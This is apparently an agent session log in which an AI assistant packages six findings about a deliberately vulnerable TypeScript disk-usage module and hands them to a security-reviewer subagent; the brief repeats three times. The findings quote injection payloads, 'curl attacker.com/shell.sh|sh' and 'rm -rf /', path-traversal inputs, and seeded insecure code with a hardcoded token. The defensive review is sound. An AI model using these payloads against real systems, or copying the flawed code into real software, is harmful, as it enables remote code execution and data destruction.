{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01MG7f1yZWSqxVysS6ATFH8M","type":"message","role":"assistant","content":[{"type":"thinking","thinking":"Now I have all the context I need. Let me prepare my curated findings from `disk-info.ts` specifically (since that's what was requested), identify the top 5 security findings, and package them for the security reviewer.\n\n**Findings from `disk-info.ts`:**\n\n1. **Command Injection (A03 - Critical)** - Line 35: `exec('du -sh ' + path, ...)` - `path` is derived from attacker-controlled `query.mountPath` with no validation. Input like `\"/; rm -rf /\"` executes arbitrary OS commands.\n2. **Path Traversal (A01 - Critical)** - Line 46: `fsSize(path)` receives the same unvalidated attacker-controlled `path`, allowing traversal outside the intended mount point.\n3. **Hardcoded Credential (A07 - Important)** - Line 20: A live API key is embedded directly in the source code, accessible to anyone with repo access and impossible to rotate without a code change.\n4. **Cryptographic Failure + Second Command Injection (A02 + A03)** - The thinking appears to continue but is cut off here.\n\nLet me continue with the remaining findings. The API communication uses unencrypted HTTP and passes the token as a URL query parameter, exposing it in logs and transit, while also injecting JSON data into a shell command for another injection vector. There's also a vulnerable pinned dependency version that predates patches for command-injection advisories, and security-relevant errors are silently swallowed without any logging, which prevents detection of failures and blocks incident response.\n\nNow I'm mapping out the threat model: the server process and filesystem are at risk, potentially including infrastructure accessed via the API token. An external HTTP request can supply malicious `mountPath` values, and the blast radius spans remote code execution from command injection, arbitrary filesystem reads through path traversal, credential theft, and token exposure over the wire.\n\nThe critical findings are command injection where the mount path gets concatenated directly into a shell command without validation—allowing payloads like shell metacharacters or command substitution to execute arbitrary code—and path traversal in the `fsSize()` call that lets attackers read files outside the intended mount point. There's also a hardcoded API credential that's exposed in cleartext.\n\nBeyond that, the cache write operation compounds the risk by sending the token in the query string over unencrypted HTTP, making it visible in logs and proxies, while also shell-interpolating the JSON payload into another `curl` command for a second injection vector. The codebase is pinned to an outdated version of the system information library that has known command-injection vulnerabilities, and error handling silently swallows exceptions rather than logging them for visibility.","signature":""}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1315,"cache_read_input_tokens":65321,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1315},"output_tokens":26,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"62235390-f59e-4803-be8d-9f40fa5d4567","uuid":"c683cba8-0c6e-4b11-b78f-390c1068b01e","request_id":"req_011CbrUhNHMSECepMaeakHa9"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01MG7f1yZWSqxVysS6ATFH8M","type":"message","role":"assistant","content":[{"type":"text","text":"The scan is complete. I have 6 security findings. Now packaging them for the security reviewer consultation."}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1315,"cache_read_input_tokens":65321,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1315},"output_tokens":26,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"62235390-f59e-4803-be8d-9f40fa5d4567","uuid":"d4f18bba-2cfa-4b76-ad7f-451fab88aaef","request_id":"req_011CbrUhNHMSECepMaeakHa9"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01MG7f1yZWSqxVysS6ATFH8M","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01DLuTcbxWMPiCiTP8vRDRA6","name":"Agent","input":{"description":"Security review of disk-info.ts","subagent_type":"lz-advisor:security-reviewer","prompt":"## Review Scope\nTypeScript disk-usage module (`review-src/disk-info.ts`) that accepts an attacker-controlled mount path, shells out to `du` via `child_process.exec`, queries `systeminformation.fsSize`, and writes results to a remote cache via HTTP. This is review-only material (never executed in production), but the attack patterns it demonstrates are real.\n\n## Threat Model Context\n**Assets:** server OS process + filesystem; hardcoded API token (`sk_live_...`) for an internal cache service.\n**Attacker profile:** any HTTP client that can supply `query.mountPath`; supply-chain attacker reachable via `systeminformation@3.42.0`.\n**Blast radius:** RCE via shell command injection (runs as server process user); arbitrary filesystem read/traversal; API token exfiltration (hardcoded, cleartext on the wire); monitoring blindness from swallowed errors.\n\n## Findings\n\n- Finding 1: Command injection via unvalidated shell concatenation\n  - File: `review-src/disk-info.ts:35`\n  - Severity (initial): Critical\n  - OWASP category: A03 Injection\n  - Description: `query.mountPath` flows through `path` directly into a string-concatenated `exec()` call with no allow-list, no quoting, no canonicalization. An attacker supplies `\"/; rm -rf /\"` or `\"$(curl attacker.com/shell.sh|sh)\"` and the shell executes arbitrary OS commands as the server process.\n  - Code context:\n    ```typescript\n    const path = query.mountPath;\n    exec('du -sh ' + path, (err, stdout) => {\n      if (err) {\n        return;\n      }\n      cacheResult(stdout);\n    });\n    ```\n\n- Finding 2: Path traversal via unsanitized fsSize sink\n  - File: `review-src/disk-info.ts:46`\n  - Severity (initial): Critical\n  - OWASP category: A01 Broken Access Control\n  - Description: The same unvalidated `path` (attacker-controlled `mountPath`) is passed directly to `fsSize()`. An attacker supplies `\"../../etc/passwd\"` or `\"../../proc/self/environ\"` to enumerate files outside the intended mount scope, potentially leaking OS secrets or environment variables.\n  - Code context:\n    ```typescript\n    const size = await fsSize(path);\n    return { path, size };\n    ```\n\n- Finding 3: Hardcoded live API credential in source\n  - File: `review-src/disk-info.ts:20`\n  - Severity (initial): Important\n  - OWASP category: A07 Identification and Authentication Failures\n  - Description: A live API token (`sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1`) is hardcoded as a module-level constant. Any developer or CI system with repo read access obtains the token. It cannot be rotated without a code change and a re-deploy; if the repo is ever made public or cloned externally the token leaks permanently.\n  - Code context:\n    ```typescript\n    const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n    ```\n\n- Finding 4: Cleartext HTTP transport with token in URL + secondary command injection\n  - File: `review-src/disk-info.ts:68-69`\n  - Severity (initial): Important\n  - OWASP category: A02 Cryptographic Failures\n  - Description: The cache write uses `http://` (not HTTPS), exposing both the API token and the payload in cleartext to any on-path observer, proxy, or access log. The token is also passed as a URL query parameter, making it appear in server logs, browser history, and HTTP Referer headers. Additionally, `JSON.stringify(parsed)` is interpolated into a second `exec('curl ...')` call, creating a secondary injection path if `parsed` contains shell metacharacters.\n  - Code context:\n    ```typescript\n    function writeCache(parsed: unknown): void {\n      const url = 'http://cache.internal/store?token=' + API_TOKEN;\n      void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n    }\n    ```\n\n- Finding 5: Known-vulnerable dependency pin (`systeminformation@3.42.0`)\n  - File: `review-src/disk-info.ts:9-15` (annotation + import)\n  - Severity (initial): Important\n  - OWASP category: A06 Vulnerable and Outdated Components\n  - Description: The source annotation explicitly pins `systeminformation@3.42.0` and notes this predates command-injection advisories patched in later major versions. Using a known-vulnerable version of a system-information library that interfaces with OS-level disk APIs introduces supply-chain risk; a malicious or compromised version could amplify the injection surfaces already present.\n  - Code context:\n    ```typescript\n    // \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin): this range\n    // predates the command-injection advisories patched in later majors\n    import { fsSize } from 'systeminformation';\n    ```\n\n- Finding 6: Security-relevant errors silently swallowed\n  - File: `review-src/disk-info.ts:55-60`\n  - Severity (initial): Suggestion\n  - OWASP category: A09 Security Logging and Monitoring Failures\n  - Description: `cacheResult` catches all errors and discards them with no logging. This includes security-relevant failures: malformed JSON from attacker-supplied stdout, cache write failures, or anomalous parsed content. Silent swallowing prevents detection of attack attempts and breaks incident response.\n  - Code context:\n    ```typescript\n    try {\n      const parsed = JSON.parse(stdout);\n      writeCache(parsed);\n    } catch (_) {\n      // swallowed\n    }\n    ```\n\n## Relevant File Contents\n\n```typescript\n// review-src/disk-info.ts (full file)\n// Disk-info module seeded for the Phase 13 security-review UAT.\n\n// Dependency pins (review material only; not installed):\n//   \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin)\nimport { exec } from 'child_process';\nimport { fsSize } from 'systeminformation';\n\n// DEFECT (hardcoded credential)\nconst API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n\ninterface DiskQuery {\n  mountPath: string;\n}\n\nexport async function getDiskUsage(query: DiskQuery): Promise<unknown> {\n  const path = query.mountPath;\n\n  // DEFECT (command injection)\n  exec('du -sh ' + path, (err, stdout) => {\n    if (err) {\n      return;\n    }\n    cacheResult(stdout);\n  });\n\n  // DEFECT (path traversal)\n  const size = await fsSize(path);\n\n  return { path, size };\n}\n\nfunction cacheResult(stdout: string): void {\n  // DEFECT (swallowed errors)\n  try {\n    const parsed = JSON.parse(stdout);\n    writeCache(parsed);\n  } catch (_) {\n    // swallowed\n  }\n}\n\n// DEFECT (cleartext HTTP + token in URL + secondary injection)\nfunction writeCache(parsed: unknown): void {\n  const url = 'http://cache.internal/store?token=' + API_TOKEN;\n  void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n}\n```\n\n## Request\nValidate these 6 findings against OWASP Top 10. Confirm or revise severity assignments. Identify any attack chains across findings, and flag any cross-cutting patterns I may have missed."},"caller":{"type":"direct"}}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1315,"cache_read_input_tokens":65321,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1315},"output_tokens":26,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"62235390-f59e-4803-be8d-9f40fa5d4567","uuid":"99f86a4d-f258-4908-a42f-9a411f79ffea","request_id":"req_011CbrUhNHMSECepMaeakHa9"}
{"type":"system","subtype":"task_started","task_id":"a9dca3042c45e67cd","tool_use_id":"toolu_01DLuTcbxWMPiCiTP8vRDRA6","description":"Security review of disk-info.ts","subagent_type":"lz-advisor:security-reviewer","task_type":"local_agent","prompt":"## Review Scope\nTypeScript disk-usage module (`review-src/disk-info.ts`) that accepts an attacker-controlled mount path, shells out to `du` via `child_process.exec`, queries `systeminformation.fsSize`, and writes results to a remote cache via HTTP. This is review-only material (never executed in production), but the attack patterns it demonstrates are real.\n\n## Threat Model Context\n**Assets:** server OS process + filesystem; hardcoded API token (`sk_live_...`) for an internal cache service.\n**Attacker profile:** any HTTP client that can supply `query.mountPath`; supply-chain attacker reachable via `systeminformation@3.42.0`.\n**Blast radius:** RCE via shell command injection (runs as server process user); arbitrary filesystem read/traversal; API token exfiltration (hardcoded, cleartext on the wire); monitoring blindness from swallowed errors.\n\n## Findings\n\n- Finding 1: Command injection via unvalidated shell concatenation\n  - File: `review-src/disk-info.ts:35`\n  - Severity (initial): Critical\n  - OWASP category: A03 Injection\n  - Description: `query.mountPath` flows through `path` directly into a string-concatenated `exec()` call with no allow-list, no quoting, no canonicalization. An attacker supplies `\"/; rm -rf /\"` or `\"$(curl attacker.com/shell.sh|sh)\"` and the shell executes arbitrary OS commands as the server process.\n  - Code context:\n    ```typescript\n    const path = query.mountPath;\n    exec('du -sh ' + path, (err, stdout) => {\n      if (err) {\n        return;\n      }\n      cacheResult(stdout);\n    });\n    ```\n\n- Finding 2: Path traversal via unsanitized fsSize sink\n  - File: `review-src/disk-info.ts:46`\n  - Severity (initial): Critical\n  - OWASP category: A01 Broken Access Control\n  - Description: The same unvalidated `path` (attacker-controlled `mountPath`) is passed directly to `fsSize()`. An attacker supplies `\"../../etc/passwd\"` or `\"../../proc/self/environ\"` to enumerate files outside the intended mount scope, potentially leaking OS secrets or environment variables.\n  - Code context:\n    ```typescript\n    const size = await fsSize(path);\n    return { path, size };\n    ```\n\n- Finding 3: Hardcoded live API credential in source\n  - File: `review-src/disk-info.ts:20`\n  - Severity (initial): Important\n  - OWASP category: A07 Identification and Authentication Failures\n  - Description: A live API token (`sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1`) is hardcoded as a module-level constant. Any developer or CI system with repo read access obtains the token. It cannot be rotated without a code change and a re-deploy; if the repo is ever made public or cloned externally the token leaks permanently.\n  - Code context:\n    ```typescript\n    const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n    ```\n\n- Finding 4: Cleartext HTTP transport with token in URL + secondary command injection\n  - File: `review-src/disk-info.ts:68-69`\n  - Severity (initial): Important\n  - OWASP category: A02 Cryptographic Failures\n  - Description: The cache write uses `http://` (not HTTPS), exposing both the API token and the payload in cleartext to any on-path observer, proxy, or access log. The token is also passed as a URL query parameter, making it appear in server logs, browser history, and HTTP Referer headers. Additionally, `JSON.stringify(parsed)` is interpolated into a second `exec('curl ...')` call, creating a secondary injection path if `parsed` contains shell metacharacters.\n  - Code context:\n    ```typescript\n    function writeCache(parsed: unknown): void {\n      const url = 'http://cache.internal/store?token=' + API_TOKEN;\n      void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n    }\n    ```\n\n- Finding 5: Known-vulnerable dependency pin (`systeminformation@3.42.0`)\n  - File: `review-src/disk-info.ts:9-15` (annotation + import)\n  - Severity (initial): Important\n  - OWASP category: A06 Vulnerable and Outdated Components\n  - Description: The source annotation explicitly pins `systeminformation@3.42.0` and notes this predates command-injection advisories patched in later major versions. Using a known-vulnerable version of a system-information library that interfaces with OS-level disk APIs introduces supply-chain risk; a malicious or compromised version could amplify the injection surfaces already present.\n  - Code context:\n    ```typescript\n    // \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin): this range\n    // predates the command-injection advisories patched in later majors\n    import { fsSize } from 'systeminformation';\n    ```\n\n- Finding 6: Security-relevant errors silently swallowed\n  - File: `review-src/disk-info.ts:55-60`\n  - Severity (initial): Suggestion\n  - OWASP category: A09 Security Logging and Monitoring Failures\n  - Description: `cacheResult` catches all errors and discards them with no logging. This includes security-relevant failures: malformed JSON from attacker-supplied stdout, cache write failures, or anomalous parsed content. Silent swallowing prevents detection of attack attempts and breaks incident response.\n  - Code context:\n    ```typescript\n    try {\n      const parsed = JSON.parse(stdout);\n      writeCache(parsed);\n    } catch (_) {\n      // swallowed\n    }\n    ```\n\n## Relevant File Contents\n\n```typescript\n// review-src/disk-info.ts (full file)\n// Disk-info module seeded for the Phase 13 security-review UAT.\n\n// Dependency pins (review material only; not installed):\n//   \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin)\nimport { exec } from 'child_process';\nimport { fsSize } from 'systeminformation';\n\n// DEFECT (hardcoded credential)\nconst API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n\ninterface DiskQuery {\n  mountPath: string;\n}\n\nexport async function getDiskUsage(query: DiskQuery): Promise<unknown> {\n  const path = query.mountPath;\n\n  // DEFECT (command injection)\n  exec('du -sh ' + path, (err, stdout) => {\n    if (err) {\n      return;\n    }\n    cacheResult(stdout);\n  });\n\n  // DEFECT (path traversal)\n  const size = await fsSize(path);\n\n  return { path, size };\n}\n\nfunction cacheResult(stdout: string): void {\n  // DEFECT (swallowed errors)\n  try {\n    const parsed = JSON.parse(stdout);\n    writeCache(parsed);\n  } catch (_) {\n    // swallowed\n  }\n}\n\n// DEFECT (cleartext HTTP + token in URL + secondary injection)\nfunction writeCache(parsed: unknown): void {\n  const url = 'http://cache.internal/store?token=' + API_TOKEN;\n  void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n}\n```\n\n## Request\nValidate these 6 findings against OWASP Top 10. Confirm or revise severity assignments. Identify any attack chains across findings, and flag any cross-cutting patterns I may have missed.","uuid":"7e46227b-d942-4a2e-8d3d-de836bef78cb","session_id":"62235390-f59e-4803-be8d-9f40fa5d4567"}
{"type":"user","message":{"role":"user","content":[{"type":"text","text":"## Review Scope\nTypeScript disk-usage module (`review-src/disk-info.ts`) that accepts an attacker-controlled mount path, shells out to `du` via `child_process.exec`, queries `systeminformation.fsSize`, and writes results to a remote cache via HTTP. This is review-only material (never executed in production), but the attack patterns it demonstrates are real.\n\n## Threat Model Context\n**Assets:** server OS process + filesystem; hardcoded API token (`sk_live_...`) for an internal cache service.\n**Attacker profile:** any HTTP client that can supply `query.mountPath`; supply-chain attacker reachable via `systeminformation@3.42.0`.\n**Blast radius:** RCE via shell command injection (runs as server process user); arbitrary filesystem read/traversal; API token exfiltration (hardcoded, cleartext on the wire); monitoring blindness from swallowed errors.\n\n## Findings\n\n- Finding 1: Command injection via unvalidated shell concatenation\n  - File: `review-src/disk-info.ts:35`\n  - Severity (initial): Critical\n  - OWASP category: A03 Injection\n  - Description: `query.mountPath` flows through `path` directly into a string-concatenated `exec()` call with no allow-list, no quoting, no canonicalization. An attacker supplies `\"/; rm -rf /\"` or `\"$(curl attacker.com/shell.sh|sh)\"` and the shell executes arbitrary OS commands as the server process.\n  - Code context:\n    ```typescript\n    const path = query.mountPath;\n    exec('du -sh ' + path, (err, stdout) => {\n      if (err) {\n        return;\n      }\n      cacheResult(stdout);\n    });\n    ```\n\n- Finding 2: Path traversal via unsanitized fsSize sink\n  - File: `review-src/disk-info.ts:46`\n  - Severity (initial): Critical\n  - OWASP category: A01 Broken Access Control\n  - Description: The same unvalidated `path` (attacker-controlled `mountPath`) is passed directly to `fsSize()`. An attacker supplies `\"../../etc/passwd\"` or `\"../../proc/self/environ\"` to enumerate files outside the intended mount scope, potentially leaking OS secrets or environment variables.\n  - Code context:\n    ```typescript\n    const size = await fsSize(path);\n    return { path, size };\n    ```\n\n- Finding 3: Hardcoded live API credential in source\n  - File: `review-src/disk-info.ts:20`\n  - Severity (initial): Important\n  - OWASP category: A07 Identification and Authentication Failures\n  - Description: A live API token (`sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1`) is hardcoded as a module-level constant. Any developer or CI system with repo read access obtains the token. It cannot be rotated without a code change and a re-deploy; if the repo is ever made public or cloned externally the token leaks permanently.\n  - Code context:\n    ```typescript\n    const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n    ```\n\n- Finding 4: Cleartext HTTP transport with token in URL + secondary command injection\n  - File: `review-src/disk-info.ts:68-69`\n  - Severity (initial): Important\n  - OWASP category: A02 Cryptographic Failures\n  - Description: The cache write uses `http://` (not HTTPS), exposing both the API token and the payload in cleartext to any on-path observer, proxy, or access log. The token is also passed as a URL query parameter, making it appear in server logs, browser history, and HTTP Referer headers. Additionally, `JSON.stringify(parsed)` is interpolated into a second `exec('curl ...')` call, creating a secondary injection path if `parsed` contains shell metacharacters.\n  - Code context:\n    ```typescript\n    function writeCache(parsed: unknown): void {\n      const url = 'http://cache.internal/store?token=' + API_TOKEN;\n      void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n    }\n    ```\n\n- Finding 5: Known-vulnerable dependency pin (`systeminformation@3.42.0`)\n  - File: `review-src/disk-info.ts:9-15` (annotation + import)\n  - Severity (initial): Important\n  - OWASP category: A06 Vulnerable and Outdated Components\n  - Description: The source annotation explicitly pins `systeminformation@3.42.0` and notes this predates command-injection advisories patched in later major versions. Using a known-vulnerable version of a system-information library that interfaces with OS-level disk APIs introduces supply-chain risk; a malicious or compromised version could amplify the injection surfaces already present.\n  - Code context:\n    ```typescript\n    // \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin): this range\n    // predates the command-injection advisories patched in later majors\n    import { fsSize } from 'systeminformation';\n    ```\n\n- Finding 6: Security-relevant errors silently swallowed\n  - File: `review-src/disk-info.ts:55-60`\n  - Severity (initial): Suggestion\n  - OWASP category: A09 Security Logging and Monitoring Failures\n  - Description: `cacheResult` catches all errors and discards them with no logging. This includes security-relevant failures: malformed JSON from attacker-supplied stdout, cache write failures, or anomalous parsed content. Silent swallowing prevents detection of attack attempts and breaks incident response.\n  - Code context:\n    ```typescript\n    try {\n      const parsed = JSON.parse(stdout);\n      writeCache(parsed);\n    } catch (_) {\n      // swallowed\n    }\n    ```\n\n## Relevant File Contents\n\n```typescript\n// review-src/disk-info.ts (full file)\n// Disk-info module seeded for the Phase 13 security-review UAT.\n\n// Dependency pins (review material only; not installed):\n//   \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin)\nimport { exec } from 'child_process';\nimport { fsSize } from 'systeminformation';\n\n// DEFECT (hardcoded credential)\nconst API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n\ninterface DiskQuery {\n  mountPath: string;\n}\n\nexport async function getDiskUsage(query: DiskQuery): Promise<unknown> {\n  const path = query.mountPath;\n\n  // DEFECT (command injection)\n  exec('du -sh ' + path, (err, stdout) => {\n    if (err) {\n      return;\n    }\n    cacheResult(stdout);\n  });\n\n  // DEFECT (path traversal)\n  const size = await fsSize(path);\n\n  return { path, size };\n}\n\nfunction cacheResult(stdout: string): void {\n  // DEFECT (swallowed errors)\n  try {\n    const parsed = JSON.parse(stdout);\n    writeCache(parsed);\n  } catch (_) {\n    // swallowed\n  }\n}\n\n// DEFECT (cleartext HTTP + token in URL + secondary injection)\nfunction writeCache(parsed: unknown): void {\n  const url = 'http://cache.internal/store?token=' + API_TOKEN;\n  void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n}\n```\n\n## Request\nValidate these 6 findings against OWASP Top 10. Confirm or revise severity assignments. Identify any attack chains across findings, and flag any cross-cutting patterns I may have missed."}]},"parent_tool_use_id":"toolu_01DLuTcbxWMPiCiTP8vRDRA6","session_id":"62235390-f59e-4803-be8d-9f40fa5d4567","uuid":"540f40a7-b324-47df-a5ac-08fcc1ae058e","timestamp":"2026-06-08T21:10:54.847Z","subagent_type":"lz-advisor:security-reviewer","task_description":"Security review of disk-info.ts"}
